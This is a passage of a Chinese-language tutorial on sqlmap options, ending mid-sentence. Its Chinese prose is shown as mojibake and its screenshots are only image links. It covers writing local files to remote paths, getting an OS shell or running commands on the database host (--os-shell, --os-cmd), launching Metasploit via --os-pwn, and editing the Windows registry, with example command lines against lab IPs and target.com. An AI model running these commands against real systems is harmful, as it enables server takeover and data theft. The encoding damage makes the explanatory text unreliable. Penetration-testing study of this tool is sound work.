src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024620.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024330.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022024519.png" alt="img"></p><h3 id="11-7-å†™å…¥æ–‡ä»¶"><a href="#11-7-å†™å…¥æ–‡ä»¶" class="headerlink" title="11.7 å†™å…¥æ–‡ä»¶"></a>11.7 å†™å…¥æ–‡ä»¶</h3><p>â€“file-write è¯»å–æœ¬åœ°æ–‡ä»¶ â€“file-dest å°†è¯»å–åˆ°çš„æ–‡ä»¶å†™å…¥åˆ°è¿œç¨‹ç»å¯¹è·¯å¾„ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020518.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025438.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020987.png" alt="img"></p><h3 id="11-8-æ£€ç´¢æ‰€æœ‰ä¿¡æ¯"><a href="#11-8-æ£€ç´¢æ‰€æœ‰ä¿¡æ¯" class="headerlink" title="11.8 æ£€ç´¢æ‰€æœ‰ä¿¡æ¯"></a>11.8 æ£€ç´¢æ‰€æœ‰ä¿¡æ¯</h3><p>-a â€“all </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020256.png" alt="img"></p><h2 id="0x0C-sqlmap-ç³»ç»Ÿå‚æ•°"><a href="#0x0C-sqlmap-ç³»ç»Ÿå‚æ•°" class="headerlink" title="0x0C sqlmap ç³»ç»Ÿå‚æ•°"></a>0x0C sqlmap ç³»ç»Ÿå‚æ•°</h2><h3 id="12-1-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#12-1-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="12.1 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>12.1 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h3><p>å‰ææ¡ä»¶ï¼š</p><ol><li>ç½‘ç«™å¿…é¡»æ˜¯rootæƒé™</li><li>æ”»å‡»è€…éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„</li><li>GPCä¸ºoffï¼ˆå³magic_quotes_gpc &#x3D; offï¼‰ï¼Œphpä¸»åŠ¨è½¬ä¹‰çš„åŠŸèƒ½å…³é—­</li><li>è‹¥éœ€è¦ä¸Šä¼ æ–‡ä»¶ï¼Œåˆ™secure_file_priv ä¸ä¸ºNULL</li></ol><p>â€“os-shell</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025967.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020059.png" alt="img"></p><h3 id="12-2-ç»“åˆMetasploit"><a href="#12-2-ç»“åˆMetasploit" class="headerlink" title="12.2 ç»“åˆMetasploit"></a>12.2 ç»“åˆMetasploit</h3><p>python sqlmap.py -u â€œæ³¨å…¥ç‚¹â€ â€“os-pwn â€“msf-path (è‹¥ä¸ä½¿ç”¨è¯¥å‚æ•°ï¼Œåˆ™è‡ªåŠ¨é€‰æ‹©é»˜è®¤è·¯å¾„) ï¼ˆåªé€‚ç”¨äºMySQL and PostgreSQL æ•°æ®åº“ï¼‰</p><h3 id="12-3-æ³¨å†Œè¡¨ä»‹ç»"><a href="#12-3-æ³¨å†Œè¡¨ä»‹ç»" class="headerlink" title="12.3 æ³¨å†Œè¡¨ä»‹ç»"></a>12.3 æ³¨å†Œè¡¨ä»‹ç»</h3><p>æ³¨å†Œè¡¨ï¼ˆRegistryï¼Œç¹ä½“ä¸­æ–‡ç‰ˆWindowsæ“ä½œç³»ç»Ÿç§°ä¹‹ä¸ºç™»å½•æ¡£ï¼‰æ˜¯Microsoft Windowsä¸­çš„ä¸€ä¸ªé‡è¦çš„æ•°æ®åº“ï¼Œç”¨äºå­˜å‚¨ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºçš„è®¾ç½®ä¿¡æ¯ã€‚æ—©åœ¨Windows 3.0æ¨å‡ºOLEæŠ€æœ¯çš„æ—¶å€™ï¼Œæ³¨å†Œè¡¨å°±å·²ç»å‡ºç°ã€‚éšåæ¨å‡ºçš„Windows NTæ˜¯ç¬¬ä¸€ä¸ªä»ç³»ç»Ÿçº§åˆ«å¹¿æ³›ä½¿ç”¨æ³¨å†Œè¡¨çš„æ“ä½œç³»ç»Ÿã€‚ä½†æ˜¯ï¼Œä»Microsoft Windows 95æ“ä½œç³»ç»Ÿå¼€å§‹ï¼Œæ³¨å†Œè¡¨æ‰çœŸæ­£æˆä¸ºWindowsç”¨æˆ·ç»å¸¸æ¥è§¦çš„å†…å®¹ï¼Œå¹¶åœ¨å…¶åçš„æ“ä½œç³»ç»Ÿä¸­ç»§ç»­æ²¿ç”¨è‡³ä»Šã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020490.png" alt="img"></p><h3 id="12-4-æ³¨å†Œè¡¨æ“ä½œ"><a href="#12-4-æ³¨å†Œè¡¨æ“ä½œ" class="headerlink" title="12.4 æ³¨å†Œè¡¨æ“ä½œ"></a>12.4 æ³¨å†Œè¡¨æ“ä½œ</h3><p>â€“reg-read â€“reg-add â€“reg-del â€“reg-key, â€“reg-value, â€“reg-data â€“reg-type</p><p>ä¾‹å¦‚ï¼š $ python sqlmap.py -u <a href="http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1">http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1</a> â€“reg-add â€“reg-key&#x3D;â€œHKEY_LOCAL_MACHINE\SOFTWARE\sqlmapâ€ â€“reg-value&#x3D;Test â€“reg-type&#x3D;REG_SZ â€“reg-data&#x3D;1</p><h2 id="0x0D-sqlmap-é€šç”¨å‚æ•°ï¼ˆä¸€ï¼‰"><a href="#0x0D-sqlmap-é€šç”¨å‚æ•°ï¼ˆä¸€ï¼‰" class="headerlink" title="0x0D sqlmap é€šç”¨å‚æ•°ï¼ˆä¸€ï¼‰"></a>0x0D sqlmap é€šç”¨å‚æ•°ï¼ˆä¸€ï¼‰</h2><h3 id="13-1-åŠ è½½-sqlite-ä¼šè¯æ–‡ä»¶"><a href="#13-1-åŠ è½½-sqlite-ä¼šè¯æ–‡ä»¶" class="headerlink" title="13.1 åŠ è½½ sqlite ä¼šè¯æ–‡ä»¶"></a>13.1 åŠ è½½ sqlite ä¼šè¯æ–‡ä»¶</h3><p>sqlmapè‡ªåŠ¨ä¸ºæ¯ä¸ªç›®æ ‡åˆ›å»ºæŒä¹…ä¼šè¯SQLiteæ–‡ä»¶ï¼Œä½äºä¸“ç”¨è¾“å‡ºç›®å½•ä¸­ï¼Œå…¶ä¸­å­˜å‚¨ä¼šè¯æ¢å¤æ‰€éœ€çš„æ‰€æœ‰æ•°æ®ã€‚å¦‚æœç”¨æˆ·æƒ³æ˜¾å¼åœ°è®¾ç½®ä¼šè¯æ–‡ä»¶ä½ç½®(ä¾‹å¦‚åœ¨ä¸€ä¸ªä½ç½®ä¸ºå¤šä¸ªç›®æ ‡å­˜å‚¨ä¼šè¯æ•°æ®)ï¼Œå¯ä»¥ä½¿ç”¨æ­¤é€‰é¡¹ã€‚</p><p>-s â€œä¼šè¯æ–‡ä»¶â€</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025437.png" alt="img"></p><h3 id="13-2-åŠ è½½-http-æ–‡æœ¬æ–‡ä»¶"><a href="#13-2-åŠ è½½-http-æ–‡æœ¬æ–‡ä»¶" class="headerlink" title="13.2 åŠ è½½ http æ–‡æœ¬æ–‡ä»¶"></a>13.2 åŠ è½½ http æ–‡æœ¬æ–‡ä»¶</h3><p>è¿™ä¸ªé€‰é¡¹éœ€è¦æŒ‡å®šæ–‡æœ¬æ–‡ä»¶çš„å‚æ•°æ¥å†™å…¥sqlmap â€“ HTTP(s)è¯·æ±‚å’ŒHTTP(s)å“åº”ç”Ÿæˆçš„æ‰€æœ‰HTTP(s)æµé‡ã€‚ è¿™ä¸»è¦ç”¨äºè°ƒè¯•ç›®çš„â€”â€”å½“æ‚¨å‘å¼€å‘äººå‘˜æä¾›ä¸€ä¸ªæ½œåœ¨çš„bugæŠ¥å‘Šæ—¶ï¼Œä¹Ÿå‘é€è¿™ä¸ªæ–‡ä»¶ã€‚ -t å‚æ•° </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020819.png" alt="img"></p><h3 id="13-3-è®¾ç½®é»˜è®¤é€‰æ‹©é€‰é¡¹"><a href="#13-3-è®¾ç½®é»˜è®¤é€‰æ‹©é€‰é¡¹" class="headerlink" title="13.3 è®¾ç½®é»˜è®¤é€‰æ‹©é€‰é¡¹"></a>13.3 è®¾ç½®é»˜è®¤é€‰æ‹©é€‰é¡¹</h3><p>å¦‚æœå¸Œæœ›sqlmapä½œä¸ºæ‰¹å¤„ç†å·¥å…·è¿è¡Œï¼Œåœ¨sqlmapéœ€è¦æ—¶ä¸éœ€è¦ä»»ä½•ç”¨æˆ·äº¤äº’ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨â€”â€“batchæ¥å¼ºåˆ¶æ‰§è¡Œã€‚è¿™å°†ä½¿sqlmapåœ¨éœ€è¦ç”¨æˆ·è¾“å…¥æ—¶ä¿æŒé»˜è®¤è¡Œä¸ºã€‚</p><h3 id="13-4-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#13-4-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="13.4 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>13.4 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h3><p>â€“os-cmd&#x3D;â€å‘½ä»¤â€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025236.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020532.png" alt="img"></p><h3 id="13-5-è®¾ç½®ç›²æ³¨å­—ç¬¦é›†"><a href="#13-5-è®¾ç½®ç›²æ³¨å­—ç¬¦é›†" class="headerlink" title="13.5 è®¾ç½®ç›²æ³¨å­—ç¬¦é›†"></a>13.5 è®¾ç½®ç›²æ³¨å­—ç¬¦é›†</h3><p>åœ¨åŸºäºå¸ƒå°”å’ŒåŸºäºæ—¶é—´çš„SQLç›²æ³¨ä¸­ï¼Œç”¨æˆ·å¯ä»¥å¼ºåˆ¶ä½¿ç”¨è‡ªå®šä¹‰å­—ç¬¦é›†æ¥åŠ é€Ÿæ•°æ®æ£€ç´¢è¿‡ç¨‹ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœè½¬å‚¨æ¶ˆæ¯æ‘˜è¦å€¼(ä¾‹å¦‚SHA1)ï¼Œåˆ™ä½¿ç”¨â€“charset&#x3D;â€œ0123456789abcdefâ€ï¼Œé¢„æœŸè¯·æ±‚æ•°é‡æ¯”æ­£å¸¸è¿è¡Œå°‘30%å·¦å³ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025360.png" alt="img"></p><h3 id="13-6-çˆ¬å–-URL"><a href="#13-6-çˆ¬å–-URL" class="headerlink" title="13.6 çˆ¬å– URL"></a>13.6 çˆ¬å– URL</h3><p>sqlmapå¯ä»¥é€šè¿‡ä»ç›®æ ‡ä½ç½®å¼€å§‹æ”¶é›†é“¾æ¥(çˆ¬è¡Œ)æ¥æ”¶é›†æ½œåœ¨çš„è„†å¼±é“¾æ¥ã€‚ä½¿ç”¨æ­¤é€‰é¡¹ï¼Œç”¨æˆ·å¯ä»¥è®¾ç½®ä¸€ä¸ªæ·±åº¦(åˆ°èµ·å§‹ä½ç½®çš„è·ç¦»)ï¼Œä½äºè¿™ä¸ªæ·±åº¦ï¼Œsqlmapä¸ä¼šè¿›å…¥æ”¶é›†é˜¶æ®µï¼Œå› ä¸ºåªè¦æœ‰æ–°çš„é“¾æ¥è¦è®¿é—®ï¼Œå°±ä¼šé€’å½’åœ°æ‰§è¡Œè¿™ä¸ªè¿‡ç¨‹ã€‚ â€“crawl python sqlmap.py -u â€œ<a href="http://192.168.21.128/sqlmap/mysql/%E2%80%9D">http://192.168.21.128/sqlmap/mysql/â€</a> â€“batch â€“crawl&#x3D;3 â€“crawl-exclude å­—ç¬¦ä¸² å­˜åœ¨å­—ç¬¦ä¸²çš„URLä¸è¿›è¡Œçˆ¬å–</p><h3 id="13-7-åœ¨-CSV-è¾“å…¥ä¸­ä½¿ç”¨çš„åˆ†å‰²å­—ç¬¦"><a href="#13-7-åœ¨-CSV-è¾“å…¥ä¸­ä½¿ç”¨çš„åˆ†å‰²å­—ç¬¦" class="headerlink" title="13.7 åœ¨ CSV è¾“å…¥ä¸­ä½¿ç”¨çš„åˆ†å‰²å­—ç¬¦"></a>13.7 åœ¨ CSV è¾“å…¥ä¸­ä½¿ç”¨çš„åˆ†å‰²å­—ç¬¦</h3><p>å½“è¢«è½¬å‚¨çš„<a href="https://cloud.tencent.com/product/cos?from_column=20065&from=20065">æ•°æ®å­˜å‚¨</a>åˆ°CSVæ ¼å¼(â€“dump-format&#x3D;CSV)æ—¶ï¼Œæ¡ç›®å¿…é¡»ç”¨â€œåˆ†ç¦»å€¼â€åˆ†éš”(é»˜è®¤å€¼æ˜¯ â€ï¼Œâ€)ã€‚å¦‚æœç”¨æˆ·æƒ³è¦è¦†ç›–å®ƒçš„é»˜è®¤å€¼ï¼Œä»–å¯ä»¥ä½¿ç”¨è¿™ä¸ªé€‰é¡¹(ä¾‹å¦‚â€“csv-del&#x3D;â€@â€)ã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025576.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020699.png" alt="img"></p><h3 id="13-8-è®¾ç½®è¾“å‡ºæ ¼å¼"><a href="#13-8-è®¾ç½®è¾“å‡ºæ ¼å¼" class="headerlink" title="13.8 è®¾ç½®è¾“å‡ºæ ¼å¼"></a>13.8 è®¾ç½®è¾“å‡ºæ ¼å¼</h3><p>å½“å°†è½¬å‚¨è¡¨æ•°æ®å­˜å‚¨åˆ°è¾“å‡ºç›®å½•ä¸­çš„ç›¸åº”æ–‡ä»¶ä¸­æ—¶ï¼Œsqlmapæ”¯æŒä¸‰ç§ä¸åŒçš„æ ¼å¼:CSVã€HTMLå’ŒSQLITEã€‚é»˜è®¤çš„æ˜¯CSVï¼Œå…¶ä¸­æ¯ä¸ªè¡¨è¡Œä¸€è¡Œä¸€è¡Œåœ°å­˜å‚¨åœ¨æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªæ¡ç›®ç”¨é€—å·åˆ†éš”(æˆ–æä¾›äº†é€‰é¡¹â€“csv-del)ã€‚å¯¹äºHTMLï¼Œè¾“å‡ºè¢«å­˜å‚¨åˆ°ä¸€ä¸ªHTMLæ–‡ä»¶ä¸­ï¼Œå…¶ä¸­æ¯ä¸€è¡Œéƒ½ç”¨æ ¼å¼åŒ–è¡¨ä¸­çš„ä¸€è¡Œè¡¨ç¤ºã€‚å¯¹äºSQLITEï¼Œè¾“å‡ºå­˜å‚¨åœ¨SQLITEæ•°æ®åº“ä¸­ï¼ŒåŸå§‹è¡¨å†…å®¹å¤åˆ¶åˆ°åŒåçš„ç›¸åº”è¡¨ä¸­ã€‚</p><p>â€“dump-format</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020870.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025291.png" alt="img"></p><h3 id="13-9-æ¢æµ‹ä¹‹å‰æ£€æµ‹-Internet-è¿æ¥"><a href="#13-9-æ¢æµ‹ä¹‹å‰æ£€æµ‹-Internet-è¿æ¥" class="headerlink" title="13.9 æ¢æµ‹ä¹‹å‰æ£€æµ‹ Internet è¿æ¥"></a>13.9 æ¢æµ‹ä¹‹å‰æ£€æµ‹ Internet è¿æ¥</h3><p>åœ¨è¿›è¡Œè¯„ä¼°ç›®æ ‡ä¹‹å‰ï¼Œæ£€æµ‹å½“å‰è®¡ç®—æœºInternetè¿æ¥æ˜¯å¦æ­£å¸¸ã€‚ç¡®ä¿æ¢æµ‹å¤±è´¥ä¸æ˜¯å› ä¸ºç½‘è·¯æ‹¦æˆªé—®é¢˜ã€‚</p><p>â€“check-internet </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020547.png" alt="img"></p><h3 id="13-10-è§£æå’Œæµ‹è¯•è¡¨å•çš„è¾“å…¥å­—æ®µ"><a href="#13-10-è§£æå’Œæµ‹è¯•è¡¨å•çš„è¾“å…¥å­—æ®µ" class="headerlink" title="13.10 è§£æå’Œæµ‹è¯•è¡¨å•çš„è¾“å…¥å­—æ®µ"></a>13.10 è§£æå’Œæµ‹è¯•è¡¨å•çš„è¾“å…¥å­—æ®µ</h3><p>â€“form </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020372.png" alt="img"></p><h2 id="0x0E-sqlmap-é€šç”¨å‚æ•°ï¼ˆäºŒï¼‰"><a href="#0x0E-sqlmap-é€šç”¨å‚æ•°ï¼ˆäºŒï¼‰" class="headerlink" title="0x0E sqlmap é€šç”¨å‚æ•°ï¼ˆäºŒï¼‰"></a>0x0E sqlmap é€šç”¨å‚æ•°ï¼ˆäºŒï¼‰</h2><h3 id="14-1-è®¾ç½®é¢„è®¡å®Œæˆæ—¶é—´"><a href="#14-1-è®¾ç½®é¢„è®¡å®Œæˆæ—¶é—´" class="headerlink" title="14.1 è®¾ç½®é¢„è®¡å®Œæˆæ—¶é—´"></a>14.1 è®¾ç½®é¢„è®¡å®Œæˆæ—¶é—´</h3><p>å¯ä»¥å®æ—¶åœ°è®¡ç®—å’Œæ˜¾ç¤ºä¼°è®¡çš„åˆ°è¾¾æ—¶é—´ï¼Œä»¥æ£€ç´¢æ¯ä¸ªæŸ¥è¯¢è¾“å‡ºã€‚å½“ç”¨äºæ£€ç´¢è¾“å‡ºçš„æŠ€æœ¯æ˜¯ä»»ä½•ç›²SQLæ³¨å…¥ç±»å‹æ—¶ï¼Œå°±ä¼šæ˜¾ç¤ºè¿™ä¸€ç‚¹ã€‚ â€“eta </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025872.png" alt="img"></p><h3 id="14-2-åˆ·æ–°ä¼šè¯æ–‡ä»¶"><a href="#14-2-åˆ·æ–°ä¼šè¯æ–‡ä»¶" class="headerlink" title="14.2 åˆ·æ–°ä¼šè¯æ–‡ä»¶"></a>14.2 åˆ·æ–°ä¼šè¯æ–‡ä»¶</h3><p>ç”±äºä¼šè¯æ–‡ä»¶çš„æ¦‚å¿µï¼Œæ‰€ä»¥æœ€å¥½çŸ¥é“æ‚¨å¯ä»¥ä½¿ç”¨é€‰é¡¹â€“flush-sessionåˆ·æ–°è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæ‚¨å¯ä»¥é¿å…sqlmapä¸­é»˜è®¤å®ç°çš„ç¼“å­˜æœºåˆ¶ã€‚å…¶ä»–å¯èƒ½çš„æ–¹æ³•æ˜¯æ‰‹åŠ¨åˆ é™¤ä¼šè¯æ–‡ä»¶ã€‚</p><h3 id="14-3-å¿½ç•¥ä¼šè¯ä¸­çš„å­˜å‚¨ç»“æœ"><a href="#14-3-å¿½ç•¥ä¼šè¯ä¸­çš„å­˜å‚¨ç»“æœ" class="headerlink" title="14.3 å¿½ç•¥ä¼šè¯ä¸­çš„å­˜å‚¨ç»“æœ"></a>14.3 å¿½ç•¥ä¼šè¯ä¸­çš„å­˜å‚¨ç»“æœ</h3><p>ä½¿ç”¨é€‰é¡¹â€“fresh-queriesæ¥å¿½ç•¥è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥ä¿æŒä¼šè¯æ–‡ä»¶ä¸å˜ï¼Œå¯¹äºæ‰€é€‰çš„è¿è¡Œï¼Œé¿å…æ¢å¤&#x2F;æ¢å¤æŸ¥è¯¢è¾“å‡ºã€‚</p><h3 id="14-4-ä½¿ç”¨-Hex-å‡½æ•°æ£€ç´¢æ•°æ®"><a href="#14-4-ä½¿ç”¨-Hex-å‡½æ•°æ£€ç´¢æ•°æ®" class="headerlink" title="14.4 ä½¿ç”¨ Hex å‡½æ•°æ£€ç´¢æ•°æ®"></a>14.4 ä½¿ç”¨ Hex å‡½æ•°æ£€ç´¢æ•°æ®</h3><p>éasciiæ•°æ®çš„æ£€ç´¢éœ€è¦ç‰¹æ®Šçš„éœ€æ±‚ã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„ä¸€ä¸ªæ–¹æ³•æ˜¯ä½¿ç”¨DBMS hexå‡½æ•°ã€‚æ•°æ®åœ¨è¢«æ£€ç´¢ä¹‹å‰è¢«ç¼–ç ä¸ºåå…­è¿›åˆ¶å½¢å¼ï¼Œç„¶åè¢«æœªç¼–ç ä¸ºåŸå§‹å½¢å¼ã€‚</p><p>â€“hex</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1%E2%80%9D">http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1â€</a> â€“hex -v 3 â€“batch</p><h3 id="14-5-è®¾ç½®è‡ªå®šä¹‰è¾“å‡ºè·¯å¾„"><a href="#14-5-è®¾ç½®è‡ªå®šä¹‰è¾“å‡ºè·¯å¾„" class="headerlink" title="14.5 è®¾ç½®è‡ªå®šä¹‰è¾“å‡ºè·¯å¾„"></a>14.5 è®¾ç½®è‡ªå®šä¹‰è¾“å‡ºè·¯å¾„</h3><p>sqlmapé»˜è®¤å°†ä¼šè¯å’Œç»“æœæ–‡ä»¶å­˜å‚¨åœ¨å­ç›®å½•è¾“å‡ºä¸­ã€‚å¦‚æœæ‚¨æƒ³ä½¿ç”¨ä¸åŒçš„ä½ç½®ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªé€‰é¡¹(ä¾‹å¦‚â€“output-dir&#x3D;&#x2F;tmp)ã€‚</p><h3 id="14-6-ä»å“åº”é¡µé¢è§£æé”™è¯¯"><a href="#14-6-ä»å“åº”é¡µé¢è§£æé”™è¯¯" class="headerlink" title="14.6 ä»å“åº”é¡µé¢è§£æé”™è¯¯"></a>14.6 ä»å“åº”é¡µé¢è§£æé”™è¯¯</h3><p>å¦‚æœwebåº”ç”¨ç¨‹åºé…ç½®ä¸ºè°ƒè¯•æ¨¡å¼ï¼Œä»¥ä¾¿åœ¨HTTPå“åº”ä¸­æ˜¾ç¤ºåç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿé”™è¯¯æ¶ˆæ¯ï¼Œsqlmapå¯ä»¥è§£æå¹¶æ˜¾ç¤ºå®ƒä»¬ã€‚è¿™å¯¹äºè°ƒè¯•å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚ç†è§£ä¸ºä»€ä¹ˆæŸä¸ªæšä¸¾æˆ–æ¥ç®¡å¼€å…³ä¸èµ·ä½œç”¨â€”â€”è¿™å¯èƒ½ä¸ä¼šè¯ç”¨æˆ·çš„ç‰¹æƒæœ‰å…³ â€“parse-error</p><p>ä¿å­˜Sqlmapé…ç½®æ–‡ä»¶ â€“save å¯ä»¥å°†å‘½ä»¤è¡Œé€‰é¡¹ä¿å­˜åˆ°é…ç½®INIæ–‡ä»¶ä¸­ã€‚ç„¶åï¼Œå¯ä»¥ä½¿ç”¨ä¹‹å‰è§£é‡Šçš„-cé€‰é¡¹ç¼–è¾‘ç”Ÿæˆçš„æ–‡ä»¶å¹¶å°†å…¶ä¼ é€’ç»™sqlmapã€‚</p><p>æ›´æ–°Sqlmap â€“update</p><h3 id="14-7-å¼ºåˆ¶è®¾ç½®-DBMS-ç¼–ç "><a href="#14-7-å¼ºåˆ¶è®¾ç½®-DBMS-ç¼–ç " class="headerlink" title="14.7 å¼ºåˆ¶è®¾ç½® DBMS ç¼–ç "></a>14.7 å¼ºåˆ¶è®¾ç½® DBMS ç¼–ç </h3><p>â€“encoding&#x3D;â€gbkâ€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025767.png" alt="img"></p><h3 id="14-8-å­˜å‚¨-HTTP-æµé‡åˆ°-HAR"><a href="#14-8-å­˜å‚¨-HTTP-æµé‡åˆ°-HAR" class="headerlink" title="14.8 å­˜å‚¨ HTTP æµé‡åˆ° HAR"></a>14.8 å­˜å‚¨ HTTP æµé‡åˆ° HAR</h3><p>â€“har&#x3D;â€HARFILEâ€ HARï¼ˆHTTP Archiveï¼‰ï¼Œæ˜¯ä¸€ä¸ªç”¨æ¥å‚¨å­˜HTTPè¯·æ±‚&#x2F;å“åº”ä¿¡æ¯çš„é€šç”¨æ–‡ä»¶æ ¼å¼ï¼ŒåŸºäºJSONã€‚ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020937.png" alt="img"></p><h3 id="14-9-ç­›é€‰å…·ä½“-Payload"><a href="#14-9-ç­›é€‰å…·ä½“-Payload" class="headerlink" title="14.9 ç­›é€‰å…·ä½“ Payload"></a>14.9 ç­›é€‰å…·ä½“ Payload</h3><p>â€“test-filter&#x3D;â€ROWâ€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022025817.png" alt="img"></p><h3 id="14-10-è¿‡æ»¤å…·ä½“-Payload"><a href="#14-10-è¿‡æ»¤å…·ä½“-Payload" class="headerlink" title="14.10 è¿‡æ»¤å…·ä½“ Payload"></a>14.10 è¿‡æ»¤å…·ä½“ Payload</h3><p>â€“test-skip&#x3D;â€BENCHMARKâ€ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020843.png" alt="img"></p><p> <strong>è¡¥å……ï¼š</strong> é’ˆå¯¹proxyæ—¥å¿—æ–‡ä»¶ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç­›é€‰ç›®æ ‡ â€“scope&#x3D;â€regexâ€</p><h2 id="0x0F-sqlmap-æ‚é¡¹å‚æ•°"><a href="#0x0F-sqlmap-æ‚é¡¹å‚æ•°" class="headerlink" title="0x0F sqlmap æ‚é¡¹å‚æ•°"></a>0x0F sqlmap æ‚é¡¹å‚æ•°</h2><h3 id="15-1-ä½¿ç”¨ç¼©å†™åŠ©è®°ç¬¦"><a href="#15-1-ä½¿ç”¨ç¼©å†™åŠ©è®°ç¬¦" class="headerlink" title="15.1 ä½¿ç”¨ç¼©å†™åŠ©è®°ç¬¦"></a>15.1 ä½¿ç”¨ç¼©å†™åŠ©è®°ç¬¦</h3><p>Sqlmapæä¾›çµæ´»çš„ç¼©å†™åŠ©è®°ç¬¦æ¥è¿›è¡Œå¿«é€Ÿä¹¦å†™å‘½ä»¤ã€‚ -z å‚æ•°</p><p>ä¾‹å¦‚ï¼š python sqlmap.py â€“batch â€“random-agent â€“ignore-proxy â€“technique&#x3D;BEU -u<a href="http://www.target.com/vuln.php?id=1%E2%80%B3">www.target.com/vuln.php?id=1â€³</a></p><p>ä½¿ç”¨åŠ©è®°ç¬¦ï¼š python sqlmap.py -z â€œbat,randoma,ign,tec&#x3D;BEUâ€ -u â€œ<a href="http://www.target.com/vuln.php?id=1%E2%80%9D">www.target.com/vuln.php?id=1â€</a></p><h3 id="15-2-è®¾ç½®æ¢æµ‹é¢„è­¦"><a href="#15-2-è®¾ç½®æ¢æµ‹é¢„è­¦" class="headerlink" title="15.2 è®¾ç½®æ¢æµ‹é¢„è­¦"></a>15.2 è®¾ç½®æ¢æµ‹é¢„è­¦</h3><p>åœ¨å‘ç°SQLæ³¨å…¥æ¼æ´æ—¶ï¼Œè¿è¡Œæœ¬æœºä¸»æœºç³»ç»Ÿå‘½ä»¤ â€“alert </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020505.png" alt="img"></p><h3 id="15-3-è®¾ç½®é—®é¢˜ç­”æ¡ˆ"><a href="#15-3-è®¾ç½®é—®é¢˜ç­”æ¡ˆ" class="headerlink" title="15.3 è®¾ç½®é—®é¢˜ç­”æ¡ˆ"></a>15.3 è®¾ç½®é—®é¢˜ç­”æ¡ˆ</h3><p>å¦‚æœç”¨æˆ·æƒ³è‡ªåŠ¨è®¾ç½®é—®é¢˜çš„ç­”æ¡ˆï¼Œå³ä½¿ä½¿ç”¨â€“batchï¼Œä½¿ç”¨â€“answersï¼Œé€šè¿‡åœ¨ç­‰å·åé¢æä¾›é—®é¢˜çš„ä»»ä½•éƒ¨åˆ†å’Œç­”æ¡ˆæ¥å®Œæˆã€‚å¦å¤–ï¼Œä¸åŒé—®é¢˜çš„ç­”æ¡ˆå¯ä»¥ç”¨åˆ†éš”ç¬¦åˆ†éš”ã€‚</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -u â€œ<a href="http://192.168.22.128/sqlmap/mysql/get_int.php?id=1%E2%80%9D%E2%80%93technique=E">http://192.168.22.128/sqlmap/mysql/get_int.php?id=1â€â€“technique=E</a> 